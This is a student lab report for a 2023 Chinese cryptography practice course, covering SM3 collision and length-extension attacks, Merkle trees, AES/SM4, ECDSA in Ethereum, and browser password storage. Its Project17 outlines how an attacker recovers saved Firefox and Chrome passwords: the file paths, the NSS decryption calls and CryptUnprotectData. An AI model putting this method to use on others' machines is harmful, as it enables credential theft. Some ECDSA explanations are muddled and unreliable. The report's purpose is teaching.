# summary
<br>

2023年春季学期《创新创业实践课》实验报告<br>

<br>
25组人员分工表：<br>
姓名：李直桐 <br>
学号：202100460076 <br>
负责project：1,2,3,4,5,9,10,17,22<br>

<br>
## *Project1: implement the naïve birthday attack of reduced SM3<br>
<br>
生日攻击：寻找哈希函数的具有相同输出的两个任意输入，即寻找碰撞。<br>
如生日悖论中所描述的，对于哈希函数H(x)，有2^m个可能的输出，那么至少有两个输入产生相同输出的概率大于0.5，则选取的随机输入数量为2^(m/2)。<br>
对于SM3算法，输出值为256bit，则我们随机选取2^128个输入，则至少有两个输入的概率大于0.5。<br>
<br>
代码思路：<br>
依次计算输入消息的哈希值，建立一个列表，将输入消息与其哈希值相对应，将本次的计算结果与列表中每个值比较，若相等，则说明碰撞成功，找到两个输出值相同的消息值。<br>
<br>
实验环境：<br>
处理器：11th Gen Intel(R) Core(TM) i5-11300H @ 3.10GHz<br>
内存：16GB LPDDR4<br>
操作系统：Win11<br>
编译器：VS2019<br>
代码语言：C++<br>
<br>
关键代码：<br>

```C++
string list[max_num];  //建立哈希值对应表
bool sm3_birthday_attack() {
	for (int i = 0; i < max_num; i++) {
		string stri = to_string(i);
		string paddingValue = padding(stri);
		string result = iteration(paddingValue);
		list[i] = result;
		for (int j = 0; j < i; j++) {
			if (list[j].substr(0, 64) == result.substr(0, 64)) {
				cout << "碰撞值:" << stri << endl;
				cout << "其哈希值为:" << endl;
				for (int i = 0; i < 8; i++) {
					cout << result.substr(8 * i, 8) << ' ';
				}
				cout << endl;
				string strj = to_string(j);
				cout << "碰撞值:" << strj << endl;
				cout << "其哈希值为:" << endl;
				for (int i = 0; i < 8; i++) {
					cout << list[j].substr(8 * i, 8) << ' ';
				}
				cout << endl;
				return 1;
			}
		}
	}
	return 0;
}
```

<br>
运行结果：<br>
因计算量过大，故以寻找哈希值前4字节相同为例，进行生日攻击。<br>
运行速度为77s<br>
<br>
![image](https://github.com/lemonade310/homework-group25/assets/139195261/2fe92a7b-85c3-41e7-876d-118d65deed32)

<br>
<br>
<br>
<br>
<br>
## Project2: implement the Rho method of reduced SM3<br>
<br>
Pollard ρ算法：该算法考虑伪随机序列xi=x0,f(x0),f(f(x0))...，其中f是多项式函数，此处选择f(x)=2*x+1，必然会形成一个环。通过多项式迭代产生数列，从中寻找整数x1和x2满足H(x1)=H(x2)。<br>
<br>
代码思路：<br>
建立两个列表，rho初值取0，迭代2*rho+1，将输入消息与其哈希值相对应，将本次的计算结果与结果列表listb[]中每个值比较，若相等，则说明碰撞成功，找到两个输出值相同的消息值。<br>

<br>
实验环境：<br>
处理器：11th Gen Intel(R) Core(TM) i5-11300H @ 3.10GHz<br>
内存：16GB LPDDR4<br>
操作系统：Win11<br>
编译器：VS2019<br>
代码语言：C++<br>
<br>
关键代码：<br>

```c++
string lista[max_num];  //用于存储原消息值
string listb[max_num];  //用于存储对应哈希值
bool sm3_rho_attack() {
	int rho = 0;
	int start = 0;
	for (int i = 0; i < max_num; i++) {
		if (rho != -1) {
			rho = 2* rho + 1;	//设定f(x)=2*x+1
		}
		else {//超过int的最大范围时，重新设定rho
			start += 1;
			rho = start;
		}
		string stri = to_string(rho);
		lista[i] = stri;  //原消息值
		string paddingValue = padding(stri);
		string result = iteration(paddingValue);
		listb[i] = result;  //对应哈希值

		for (int j = 0; j < i; j++) {
			if (listb[j].substr(0, 64) == result.substr(0, 64) && stri != lista[j]) {
				cout << "碰撞值:" << stri << endl;
				cout << "其哈希值为:" << endl;
				for (int i = 0; i < 8; i++) {
					cout << result.substr(8 * i, 8) << ' ';
				}
				cout << endl;
				
				cout << "碰撞值:" << lista[j] << endl;
				cout << "其哈希值为:" << endl;
				for (int i = 0; i < 8; i++) {
					cout << listb[j].substr(8 * i, 8) << ' ';
				}
				cout << endl;
				return 1;
			}
		}
	}
	return 0;
}
```

运行结果：<br>
因计算量过大，故以寻找哈希值前4字节相同为例，进行Pollard ρ攻击。<br>
运行速度为137s<br>
![image](https://github.com/lemonade310/homework-group25/assets/139195261/bedc2087-f2f1-4c84-8723-9b4e9f72864a)

<br>
<br>
<br>
<br>
<br>
<br>
## *Project3: implement length extension attack for SM3, SHA256, etc.<br>
<br>
长度扩展攻击：假设我们有两段数据S和M以及单向散列函数h，其中S是机密信息。我们通过hash=h(S||M)计算hash值,通过计数数据的hash与原始hash对比来校验数据是否可靠。<br>
<br>
代码思路：<br>
长度扩展攻击需要我们知道消息值压缩后的结果以及消息值的长度，我们对扩展值进行消息填充，并加上原始消息值的长度，将原始消息的哈希值作为IV对此数据进行迭代压缩，得到新的哈希值，与原始哈希值比较，若相等，则说明长度扩展攻击成功。<br>
<br>
实验环境：<br>
处理器：11th Gen Intel(R) Core(TM) i5-11300H @ 3.10GHz<br>
内存：16GB LPDDR4<br>
操作系统：Win11<br>
编译器：VS2019<br>
代码语言：C++<br>
<br>
关键代码：<br>

```c++
string sm3_len_extension_attack(string hash1,int len, string exstr) {
	string paddingvalue = padding(exstr);//扩展消息填充
	string newstr = DecToHex(HexToDec(paddingvalue) + len);//将扩展的消息与原始长度组装在一起
	string hash2 = new_iteration(newstr, hash1);  //将原始哈希值作为IV对其进行迭代压缩
	return hash2;
}
```


运行结果：<br>
以原始数据与扩展数据均为256bit为例<br>
运行速度为0.001s<br>
![image](https://github.com/lemonade310/homework-group25/assets/139195261/41c65db5-aa4a-4193-bc87-3ced7621d2c7)

<br>
<br>
<br>
<br>
<br>
<br>
<br>
##*Project4: do your best to optimize SM3 implementation (software)<br>
<br>
软件优化：我们可以通过消除循环的低效率、减少过程调用、循环展开、提高并行性等方法对代码进行优化，从而加速代码计算速度，提高代码的运行效率，实现代码的软件优化。<br>
<br>
如图，str.size()在每次循环时都会被计算一次，但是该值在循环中是不改变的，所以我们可以通过将此计算的值赋给s，从而消除每次循环调用的低效率，而实现优化。<br>
<br>
关键代码：<br>
![image](https://github.com/lemonade310/homework-group25/assets/139195261/c312ff85-9429-4fa1-9343-ea043075a4b4)<br>
![image](https://github.com/lemonade310/homework-group25/assets/139195261/4000a4b3-470c-49b7-bbfa-87379adedc8d)<br>

<br>
OpenMP(Open Multi-Processing)是一种用于共享内存并行系统的多线程程序设计方案，支持的编程语言包括C、C++和Fortran。OpenMP提供了对并行算法的高层抽象描述，通过线程实现并行化，特别适合在多核CPU机器上的并行程序设计。编译器根据程序中添加的pragma指令，自动将程序并行处理，使用OpenMP降低了并行编程的难度和复杂度。当编译器不支持OpenMP时，程序会退化成普通（串行）程序。程序中已有的OpenMP指令不会影响程序的正常编译运行。OpenMP可以实现多线程并行，提高程序的并行性，而实现优化。<br>
<br>
关键代码：<br>
![image](https://github.com/lemonade310/homework-group25/assets/139195261/29c59bf9-76ef-4889-b817-29a7b19b111f)

<br>


<br>
实验环境：<br>
处理器：11th Gen Intel(R) Core(TM) i5-11300H @ 3.10GHz<br>
内存：16GB LPDDR4<br>
操作系统：Win11<br>
编译器：VS2019<br>
代码语言：C++<br>
<br>
<br>

运行结果：<br>
以32字节数据进行压缩为例<br>
优化后运行速度为0.177s<br>
![image](https://github.com/lemonade310/homework-group25/assets/139195261/e869b37a-92a7-45df-866b-74d247ff3554)
<br>
<br>
<br>
<br>
<br>
<br>
*Project5: Impl Merkle Tree following RFC6962<br>
<br>
默克尔树：默克尔树的最底下的一层节点是数据块，对每两个相邻的数据块取hash并将它们的值再次进行hash得到一个新的节点。再向上将得到的两个相邻的新节点的值做一次hash得到一个上层节点，直至最终得到一个根节点。默克尔树可以被用于验证任何类型的数据的存储。通常被用作与其他节点的计算机之间进行数据转移的数据完整性以及正确性的校验。<br>
<br>
![image](https://github.com/lemonade310/homework-group25/assets/139195261/ad2fa340-0dfa-4d8f-99c4-d7b56c7145b8)

<br>
比特币中的默克尔树应用：<br>
在比特币中，默克尔树主要负责做交易打包的校验，在 block header 中保存了该区块中打包的所有交易组成的一颗默克尔树的根hash值。默克尔树的特性保证了一旦这个区块被链上其他的节点接受，成为最长有效链的一部分之后。这个节点中的交易就不会再被改变，因为一旦改变其中的交易，就会导致整棵树的根hash值产生变化，最终当前区块的hash值也会改变。这个区块就不会被其他节点接受。<br>
<br>
<br>
实验环境：<br>
处理器：11th Gen Intel(R) Core(TM) i5-11300H @ 3.10GHz<br>
内存：16GB LPDDR4<br>
操作系统：Win11<br>
编译器：VS2019<br>
代码语言：C++<br>
<br>

代码思路：<br>
建立节点类与默克尔树类，完善相应函数部分，对于默克尔树，重要部分为建立叶子结点列表、构造默克尔树与验证数据三部分。<br>
<br>
函数BuildLeaves()用于建立叶子结点列表，输入建立默克尔树的基础字符串，装入容器vector中，计算每个字符串的哈希值，作为叶子结点，压入结点列表中。<br>
函数BuildTree()用于构建Merkle Tree，循环中每次传入结点列表的一列，计算相邻两个结点的哈希值，作为父节点，直至得到根节点。<br>


关键代码：<br>
```C++
void MerkleTree::BuildLeaves(vector<string> base_leaf) { //建立叶子节点列表
	vector<node*> new_leaf;

	//cout << "叶子结点及对应的哈希值：" << endl;

	for (auto leaf : base_leaf) { //给每一个字符串创建对应节点，并通过这个字符串设置哈希值
		node* new_node = new node;
		new_node->setHash(leaf);
		//cout << leaf <<"的哈希值为："<< new_node->getHash() << endl;

		new_leaf.push_back(new_node);
	}

	nodelist.push_back(new_leaf);//将叶子结点压入结点列表中
	cout << endl;
}

void MerkleTree::BuildTree() { //构造Merkle Tree
	int count = 1;
	do{
		vector<node*> new_nodes;
		makeBinary(nodelist.end()[-1]); //传入尾元素 即一个节点列表
		cout << "第"<<count<<"层结点由左至右为:" << endl;
		printTreeLevel(nodelist.end()[-1]);//打印该层结点
		cout << endl;
		for (int i = 0; i < nodelist.end()[-1].size(); i += 2){
			node* new_parent = new node; //设置父亲节点
			//将列表的第i和第i+1个结点的父节点设置为new_parent
			nodelist.end()[-1][i]->setParent(new_parent);
			nodelist.end()[-1][i + 1]->setParent(new_parent);

			//父节点哈希值=Hash(左孩子+右孩子)
			new_parent->setHash(nodelist.end()[-1][i]->getHash() + nodelist.end()[-1][i + 1]->getHash());
			//将该父节点的左右孩子节点设置为第i和第i+1个结点
			new_parent->setChildren(nodelist.end()[-1][i], nodelist.end()[-1][i + 1]);
			//将new_parent压入new_nodes
			new_nodes.push_back(new_parent);
		}
		
		nodelist.push_back(new_nodes); //将新一轮的父节点new_nodes压入nodelist
		count++;

	} while (nodelist.end()[-1].size() > 1); //这样每一轮得到新一层的父节点，直至得到根节点，退出循环
	cout << "第" << count << "层结点由左至右为:" << endl;
	printTreeLevel(nodelist.end()[-1]);
	cout << endl;

	cout << "该默克尔树共" << count << "层" << endl;
	MerkleRoot = nodelist.end()[-1][0]->getHash(); //根节点的哈希值
	cout << "根节点为：" << MerkleRoot << endl << endl;
}
```
<br>
用户只需要按照规则将自己账户进行一次哈希计算，找到其在这个树中的位置，和相邻节点，然后再一层层的向上计算哈希，最终计算出树根，如果和官方公布的一致那就说明是准备金无误的。<br>
<br>
函数Hash_Verify()用于验证数据的正确性，用户输入自己的数据，计算哈希值，与默克尔树的叶子结点比对，若存在相等结点，则说明用户数据存在于默克尔树中；与兄弟结点做哈希，得到父节点，父节点也继续与兄弟结点做哈希，直至得到根节点，与原本存储的根节点作比较，如果相等，则说明数据没有被修改过。<br>
<br>
关键代码：<br>

```c++
bool MerkleTree::Hash_Verify(string hash){//验证是否被修改过
	node* venode = nullptr;
	string act_hash = hash;

	for (int i = 0; i < nodelist[0].size(); i++){//寻找是否该结点是否存在
		if (nodelist[0][i]->getHash() == hash){
			venode = nodelist[0][i];
		}
	}
	if (venode == nullptr){
		return 0;
	}

	cout << "验证的哈希值:" << endl;
	cout << act_hash << endl;

	do {//验证merkle tree是否改变过 
		if (venode->ifleft() == 0){//若为左孩子，则+右兄弟做哈希
			act_hash = iteration(padding(act_hash + venode->getSibling()->getHash()));
		}
		else{//若为右孩子，则左兄弟+做哈希
			act_hash = iteration(padding(venode->getSibling()->getHash() + act_hash));
		}
		cout << act_hash << endl;

		venode = venode->getParent();
	} while ((venode->getParent()) != NULL); //到达根节点

	return act_hash == MerkleRoot ? 1 : 0;
}
```

<br>
运行结果：<br>
哈希函数以SM3为例，输入8组数据，<br>
构建默克尔树的运行速度为5.1s，<br>
验证的运行速度为1.5s。<br>
<br>
![image](https://github.com/lemonade310/homework-group25/assets/139195261/ef2aed86-7fc8-481f-9a99-6735a18a798d)

<br>

![image](https://github.com/lemonade310/homework-group25/assets/139195261/47db45d0-d6e5-451e-b75b-f24c16829681)

<br>

<br>
<br>
<br>
<br>
<br>
*Project9: AES / SM4 software implementation<br>
<br>
AES为分组密码，分组密码也就是把明文分成一组一组的，每组长度相等，每次加密一组数据，直到将整个明文加密完成。<br>
AES的密钥支持三种长度：AES128、AES192、AES256。密钥的长度决定了AES加密的轮数，并且不同阶段的有不同的处理步骤，AES的核心就是实现一轮中的所有操作。我们可以将不同轮次分为初始轮、普通轮、最终轮。<br>
初始轮它只做一个操作：轮密钥加<br>
普通轮有四个操作步骤：①字节代换、②行移位、③列混淆、④轮密钥加<br>
最终轮有三个操作步骤：①字节代换、②行移位、③轮密钥加<br>
以AES128为例，AES的加密公式为C=E(K,P)，在加密函数E中，会执行一个轮函数，并且执行10次这个轮函数，这个轮函数的前9次执行的操作是一样的，只有第10次有所不同。<br>
<br>
![image](https://github.com/lemonade310/homework-group25/assets/139195261/dc3f975e-01d0-4a0d-bcfb-251a76773de8)

<br>
实验环境：<br>
处理器：11th Gen Intel(R) Core(TM) i5-11300H @ 3.10GHz<br>
内存：16GB LPDDR4<br>
操作系统：Win11<br>
编译器：VS2019<br>
代码语言：C++<br>
<br>
关键代码：<br>
①行移位：<br>

```c++
void ShiftRows(unsigned char parray[4][4]){
    // 复制parray到temp
    unsigned char temp[4][4];
    for (int i = 0; i < 4; i++){
        for (int j = 0; j < 4; j++)
            temp[i][j] = parray[i][j];
    }
    // 开始移位
    for (int i = 0; i < 4; i++){
        // 第一行不变
        // 第二行向左移一个字节
        if (i == 1){
            for (int j = 0; j < 3; j++)
                parray[i][j] = parray[i][j + 1];
            parray[i][3] = temp[i][0];
        }
        // 第三行向左移两个字节
        if (i == 2){
            for (int j = 0; j < 2; j++)
                parray[i][j] = parray[i][j + 2];
            parray[i][2] = temp[i][0];
            parray[i][3] = temp[i][1];
        }
        // 第四行向左移三个字节
        if (i == 3){
            for (int j = 3; j > 0; j--)
                parray[i][j] = parray[i][j - 1];
            parray[i][0] = temp[i][3];
        }
    }
}
```
<br>
②列混合：<br>

```c++
void MixColums(unsigned char parray[4][4]){
    unsigned char temp[4][4];
    for (int i = 0; i < 4; i++){
        for (int j = 0; j < 4; j++)
            temp[i][j] = parray[i][j];
    }
    for (int i = 0; i < 4; i++){
        for (int j = 0; j < 4; j++){
            parray[i][j] = GFmu(c[i][0], temp[0][j]) ^ GFmu(c[i][1], temp[1][j]) ^ GFmu(c[i][2], temp[2][j]) ^ GFmu(c[i][3], temp[3][j]);
        }
    }
}
```

<br>
③轮密钥生成：<br>

```c++
void KeyExtend(unsigned char karray[4][4]){
    // 将主密钥放入扩展数组
    KeyColumsCombine(karray, carray);
    for (int i = 4, j = 0; i < 44; i++){
        // 4的整数倍要经过g函数
        if (i % 4 == 0){
            carray[i] = carray[i - 4] ^ g(carray[i - 1], j);
            j++; // 下一轮
        }
        else
            carray[i] = carray[i - 1] ^ carray[i - 4];
    }
}
```

<br>
④轮密钥加密：<br>

```c++
void AddKeyRound(unsigned char parray[4][4], int round){
     // 存放列的子密钥
    unsigned char rarray[4];
    for (int i = 0; i < 4; i++){
        // 从carray[44]中取出，放入rarray[4]
        SplitNumToArray(carray[round * 4 + i], rarray);
        // 一列一列加密
        for (int j = 0; j < 4; j++){
            parray[j][i] = parray[j][i] ^ rarray[j];
        }
    }
}
```

<br>
<br>
运行结果：<br>
以加密128bit数据为例<br>
运行速度为0.001s。<br>
![image](https://github.com/lemonade310/homework-group25/assets/139195261/c6bc7576-b946-4b0a-9c75-a53d3fe18ff2)

<br>
<br>
<br>
<br>
SM4算法是我国商用密码标准，是一个分组加密算法，分组长度和密钥长度均128bit。SM4算法使用32轮的非线性迭代结构。SM4在最后一轮非线性迭代之后加上了一个反序变换，因此SM4中只要解密密钥是加密密钥的逆序，它的解密算法与加密算法就可以保持一致。SM4的主体运算是非平衡Feistel网络。整体逻辑结构如图所示，经过32轮变换把明文变换为密文。<br>
![image](https://github.com/lemonade310/homework-group25/assets/139195261/e118424f-c520-4d4d-8e0f-cdb546a19e63)

<br>
<br>
<br>
密钥扩展算法<br>
SM4 密码算法采用 32 轮的迭代加密结构，拥有 128 位加密密钥，一共使用 32轮密钥，每一轮的加密使用 32 位的一个轮密钥。SM4 算法的特点使得它需要使用一个密钥扩展算法，在加密密钥当中产生 32 个轮密钥。在这个密钥的扩展算法当中有常数 FK、固定参数 CK 这两个数值，具体算法如下：<br>
①(K0，K1，K2，K3)=(MK0⊕FK0，MK1⊕FK1,MK2⊕FK2,MK3⊕FK3)<br>
②For i=0,1,…,30,31 Do<br>
rki=K(i+4)=Ki⊕T’(K(i+1)⊕K(i+2)⊕K(i+3)⊕CKi)<br>
<br>
<br>
实验环境：<br>
处理器：11th Gen Intel(R) Core(TM) i5-11300H @ 3.10GHz<br>
内存：16GB LPDDR4<br>
操作系统：Win11<br>
编译器：VS2019<br>
代码语言：C<br>
<br>
关键代码：<br>

```c
    uint32_t K[36];
    K[0] = MK[0] ^ FK[0];
    K[1] = MK[1] ^ FK[1];
    K[2] = MK[2] ^ FK[2];
    K[3] = MK[3] ^ FK[3];
//KeyExtension_Loop:
    for (i = 0; i < 32; i++)
    {
        uint32_t B = CK[i] ^ K[i + 1] ^ K[i + 2] ^ K[i + 3];
        uint32_t C = (uint32_t)Sbox[(uint8_t)B] + ((uint32_t)Sbox[(uint8_t)(B >> 8)] << 8)
            + ((uint32_t)Sbox[(uint8_t)(B >> 16)] << 16) + ((uint32_t)Sbox[(uint8_t)(B >> 24)] << 24);
        uint32_t D = C ^ (C << 13 | C >> 19) ^ (C << 23 | C >> 9);
        K[i + 4] = K[i] ^ D;
    }
```

<br>
SM4 的加密算法<br>
SM4 密码算法的数据分组长度为 128 比特，密钥长度也是 128 比特，是分组算法当中的一种。它采用 32 轮迭代结构来作为它的加密算法，每轮使用一个轮密钥。设输入的明文为四个字(X0，X1，X2, X3)，一共有 128 位。输入轮密钥为rki,i=0,1,…，31，一共 32 个字。输出密文为四个字(Y0，Y1，Y2, Y3)，128 位。<br>
则这个加密算法可描述如下:<br>
①首先执行32次迭代运算：<br>
Xi+4=F(Xi,Xi+1,Xi+2,Xi+3,rki)=Xi⊕T(Xi⊕Xi+1⊕Xi+2⊕Xi+3⊕rki),i=0,1,···31<br>
②对最后一轮数据进行反序变换并得到密文输出：<br>
(Y0,Y1,Y2,Y3)=R(X32,X33,X34,X35)=(X35,X34,X33,X32)。<br>
<br>
关键代码：<br>

```c
    uint32_t cipher[36];
    cipher[0] = plain[0];
    cipher[1] = plain[1];
    cipher[2] = plain[2];
    cipher[3] = plain[3];

//SM4_enc:
    for (i = 0; i < 32; i++)
    {
        uint32_t A = cipher[i + 1] ^ cipher[i + 2] ^ cipher[i + 3] ^ K[i + 4];
        uint32_t B = (uint32_t)Sbox[(uint8_t)A] + ((uint32_t)Sbox[(uint8_t)(A >> 8)] << 8)
            + ((uint32_t)Sbox[(uint8_t)(A >> 16)] << 16) + ((uint32_t)Sbox[(uint8_t)(A >> 24)] << 24);
        uint32_t C = B ^ (B << 2 | B >> 30) ^ (B << 10 | B >> 22) ^ (B << 18 | B >> 14) ^ (B << 24 | B >> 8);
        cipher[i + 4] = cipher[i] ^ C;
    }

    M[0] = cipher[35];
    M[1] = cipher[34];
    M[2] = cipher[33];
    M[3] = cipher[32];
    
}
```

<br>
运行结果：<br>
以加密128bit数据为例<br>
运行速度为0ms。<br>
<br>
![image](https://github.com/lemonade310/homework-group25/assets/139195261/799ddf1c-c834-4a51-ad3b-2429693474d1)<br>

<br>
<br>
<br>
<br>
<br>
*Project10: report on the application of this deduce technique in Ethereum with ECDSA<br>
<br>
一、ECDSA概述<br>
椭圆曲线数字签名算法ECDSA (Elliptic Curve Digital Signature Algorithm) 是一个基于椭圆曲线的签名算法。对某个消息进行签名的目的是使接收者确认该消息是由签名者发送的，且未经过篡改。ECDSA是使用椭圆曲线密码（ECC）对数字签名算法（DSA）的模拟。ECDSA于1999年成为ANSI标准，并于2000年成为IEEE和NIST标准。<br>
<br>
它在1998年既已为ISO所接受，并且包含它的其他一些标准亦在ISO的考虑之中。与普通的离散对数问题（discrete logarithm problem DLP）和大数分解问题（integer factorization problem IFP）不同，椭圆曲线离散对数问题（elliptic curve discrete logarithm problem ECDLP）没有亚指数时间的解决方法。因此椭圆曲线密码的单位比特强度要高于其他公钥体制。<br>
<br>
数字签名算法（DSA）在联邦信息处理标准FIPS中有详细论述，称为数字签名标准。它的安全性基于素域上的离散对数问题。椭圆曲线密码（ECC）由Neal Koblitz和Victor Miller于1985年发明。它可以看作是椭圆曲线对先前基于离散对数问题（DLP）的密码系统的模拟，只是群元素由素域中的元素数换为有限域上的椭圆曲线上的点。<br>
<br>
椭圆曲线密码体制的安全性基于椭圆曲线离散对数问题（ECDLP）的难解性。椭圆曲线离散对数问题远难于离散对数问题，椭圆曲线密码系统的单位比特强度要远高于传统的离散对数系统。因此在使用较短的密钥的情况下，ECC可以达到于DL系统相同的安全级别。这带来的好处就是计算参数更小，密钥更短，运算速度更快，签名也更加短小。因此椭圆曲线密码尤其适用于处理能力、存储空间、带宽及功耗受限的场合。<br>
<br>
ECDSA的安全性质：不可伪造性、不可否认性和完整性保证。<br>
<br>
二、ECDSA原理<br>
ECDSA是ECC与DSA的结合，整个签名过程与DSA类似，所不一样的是签名中采取的算法为ECC，最后签名出来的值也是分为r,s。<br>
<br>
签名过程如下：<br>
1、选择一条椭圆曲线Ep(a,b)，和基点G；<br>
2、选择私有密钥k（k<n，n为G的阶），利用基点G计算公开密钥K=kG；<br>
3、产生一个随机整数r（r<n），计算点R=rG；<br>
4、将原数据和点R的坐标值x,y作为参数，计算SHA1做为hash，即Hash=SHA1(原数据,x,y)；<br>
5、计算s≡r - Hash * k (mod n)<br>
6、r和s做为签名值，如果r和s其中一个为0，重新从第3步开始执行<br>
<br>
验证过程如下：<br>
1、接受方在收到消息(m)和签名值(r,s)后，进行以下运算<br>
2、计算：sG+H(m)P=(x1,y1), r1≡ x1 mod p。<br>
3、验证等式：r1 ≡ r mod p。<br>
4、如果等式成立，接受签名，否则签名无效。<br>
<br>
实现步骤<br>
第一步：初始化密钥组，生成ECDSA算法的公钥和私钥<br>
第二步：执行私钥签名，使用私钥签名，生成私钥签名<br>
第三步：执行公钥签名，生成公钥签名<br>
第四步：使用公钥验证私钥签名<br>
<br>
Secp256k1是指比特币中使用的ECDSA(椭圆曲线数字签名算法)曲线的参数，以太坊也使用了Secp256k1，对以太坊一笔交易进行签名的大致步骤如下： <br>
1、对交易数据进行 RLP 编码 <br>
2、对第一步得到的编码进行哈希 <br>
3、将哈希与标识以太坊的特定字符串拼接在一起，再次哈希。这一步是为了保证该签名仅在以太坊上可用 <br>
4、用上一节介绍的ECDSA算法对第三步得到的哈希进行签名，得到 (r, s, v) <br>
5、将第四步得到的签名与交易数据拼接，再次进行RLP编码，得到最终的签名消息<br>
<br>
<br>
三、ECDSA在以太坊中的应用<br>
交易签名验证：在以太坊中，每个交易都需要进行数字签名来验证其合法性。发送方使用私钥对交易进行签名，接收方使用发送方的公钥和签名来验证交易的真实性。ECDSA算法被用于生成和验证这些数字签名，确保交易的安全性和完整性。<br>
<br>
合约部署和调用：以太坊中的智能合约也需要进行数字签名来验证其合法性。合约的创建者使用私钥对合约进行签名，以太坊网络中的节点使用公钥和签名来验证合约的真实性。ECDSA算法被用于生成和验证这些数字签名，确保合约的安全性和完整性。<br>
<br>
账户身份验证：以太坊中的账户也可以使用ECDSA算法进行身份验证。用户可以使用私钥对其账户进行签名，以太坊网络中的节点使用公钥和签名来验证账户的真实性。这种身份验证机制可以防止恶意用户冒充其他账户进行欺诈行为。<br>
<br>
消息验证：以太坊中的消息也可以使用ECDSA算法进行验证。发送方使用私钥对消息进行签名，接收方使用发送方的公钥和签名来验证消息的真实性。这种消息验证机制可以确保消息的完整性和真实性。<br>
<br>
总之，ECDSA在以太坊中广泛应用于交易签名验证、合约部署和调用、账户身份验证以及消息验证等方面，保证了以太坊网络的安全性和完整性。<br>
<br>
四、该推导技术在以太坊ECDSA中的应用<br>
1、密钥生成<br>
传统的ECDSA密钥生成过程包括选择一个随机数k，并计算公钥Q=k*G，其中G是基点。然而，选择合适的随机数k是一个困难的问题，因为k的选择会影响到私钥的安全性。推导技术通过优化随机数的选择过程，可以减少私钥被猜测的风险，从而提高密钥生成的效率和安全性。<br>
2、签名验证<br>
传统的ECDSA签名验证过程包括计算一个点R=r*G，并将其x坐标与签名中的r进行比较。然而，这个比较操作需要进行一次椭圆曲线点的加法运算，导致了一定的计算开销。推导技术通过优化签名验证过程中的计算步骤，可以减少计算开销，提高签名验证的效率。<br>
<br>
总之，ECDSA在以太坊区块链中发挥着重要作用，保护了交易的安全性和完整性，同时确保了用户的身份验证和授权。它是以太坊网络的基石，为用户提供了安全可靠的交易环境。同时，加密技术的进步将进一步提高ECDSA在保护平台交易方面的效率和韧性。<br>
<br>
实验环境：<br>
处理器：11th Gen Intel(R) Core(TM) i5-11300H @ 3.10GHz<br>
内存：16GB LPDDR4<br>
操作系统：Win11<br>
编译器：python3.10(64-bit) <br>
代码语言：Python<br>
<br>


代码实现：<br>

```python
from ecdsa import SigningKey, SECP256k1, VerifyingKey
import time

#生成公钥、私钥
def generate_keys():
    sk = SigningKey.generate(curve=SECP256k1)
    vk = sk.get_verifying_key()
    secret_key = sk.to_string().hex()
    verify_key = vk.to_string().hex()
    return secret_key,verify_key

#签名
def ecdsa_sign(secret_key, m):
    sk = SigningKey.from_string(bytes.fromhex(secret_key), curve=SECP256k1)
    signature = sk.sign(bytes(m, 'utf-8'))
    return signature.hex()

#利用函数verify验证签名
def Verify(verify_key, signature, m):
    vk = VerifyingKey.from_string(bytes.fromhex(verify_key), curve=SECP256k1)
    return vk.verify(bytes.fromhex(signature), bytes(m, 'utf-8'))

if __name__ == '__main__':
    sk, pk = generate_keys()
    m = 'message'
    t1=time.time()
    signature = ecdsa_sign(sk, m)
    t2=time.time()
    print('signature: ', signature)
    print('signature time: ',t2-t1,'s')
    t3=time.time()
    ver=Verify(pk, signature,m)
    t4=time.time()
    print('verification result: ', ver)
print('verification time: ',t4-t3,'s')
```

<br>
运行结果：<br>
签名时间为0s，验证时间为0s<br>
![image](https://github.com/lemonade310/homework-group25/assets/139195261/52725b43-2e45-4c6a-88ca-86e4e1056556)

<br>
<br>
<br>
<br>
<br>
*Project17：比较Firefox和谷歌的记住密码插件的实现区别<br>
<br>
在Firefox浏览器案例中，如果采用高强度的主密码，账号的细节资料是非常难获取的。<br>
<br>
Firefox浏览器，使用NSS的开源库中一个叫做”Security Decoder Ring”，或叫SDR的API来帮助实现账号证书的加密和解密函数。<br>
<br>
当一个Firefox配置文件被首次创建时，一个叫做SDR的随机key和一个Salt（Salt，在密码学中，是指通过在密码任意固定位置插入特定的字符串，让散列后的结果和使用原始密码的散列结果不相符，这种过程称之为“加盐”）就会被创建并存储在一个名为“key3.db”的文件中。利用这个key和盐，使用3DES加密算法来加密用户名和密码。密文是Base64编码的，并存储在一个叫做signons.sqlite的sqlite数据库中。Signons.sqlite和key3.db文件均位于%APPDATA%\Mozilla\Firefox\Profiles\[random_profile]目录。<br>
<br>
所以我们要做的就是得到SDR密钥。正如此处解释的，这个key被保存在一个叫PCKS#11软件“令牌”的容器中。该令牌被封装进入内部编号为PKCS#11的“槽位”中。因此需要访问该槽位来破译账户证书。<br>
<br>
还有一个问题，这个SDR也是用3DES(DES-EDE-CBC)算法加密的。解密密钥是Mozilla叫做“主密码”的hash值，以及一个位于key3.db文件中对应的叫做“全局盐”的值。<br>
<br>
Firefox用户可以在浏览器的设置中设定主密码，但关键是好多用户不知道这个特性。正如我们看到的，用户整个账号证书的完整性链条依赖于安全设置中选择的密码，它是攻击者唯一不知道的值。如果用户使用一个强健的主密码，那么攻击者想要恢复存储的证书是不太可能的。<br>
<br>
那么——如果用户没有设置主密码，空密码就会被使用。这意味着攻击者可以提取全局盐，获得它与空密码做hash运算结果，然后使用该结果破译SDR密钥。再用破译的SDR密钥危害用户证书。<br>
<br>
<br>
调用的函数：<br>
PK11_GetInternalKeySlot() //得到内部key槽<br>
PK11_Authenticate() //使用主密码对slot鉴权<br>
PK11_FindFixedKey() //从slot中获得SDR密钥<br>
Pk11_Decrypt() //使用SDR密钥破译Base64编码的数据<br>
<br>
![image](https://github.com/lemonade310/homework-group25/assets/139195261/d6149db9-9630-440b-9332-43e1969f66cc)

<br>
<br>
而Chrome浏览器没有主密钥，更容易提取密码。Chrome浏览器加密后的密钥存储于%APPDATA%\..\Local\Google\Chrome\User Data\Default\Login Data”下的一个SQLite数据库中。密码是调用Windows API函数CryptProtectData来加密的。这意味着，只有用加密时使用的登陆证书，密码才能被恢复。破解密码，只需要调用Windows API中的CryptUnprotectData函数。<br>

<br>
代码思路：<br>
get_encryption_key()函数提取并解码用于加密密码的AES密钥，这"%USERPROFILE%\AppData\Local\Google\Chrome\User Data\Local State"作为 JSON 文件存储在路径中。<br>
decrypt_password() 将加密密码和 AES 密钥作为参数，并返回密码的解密版本。<br>
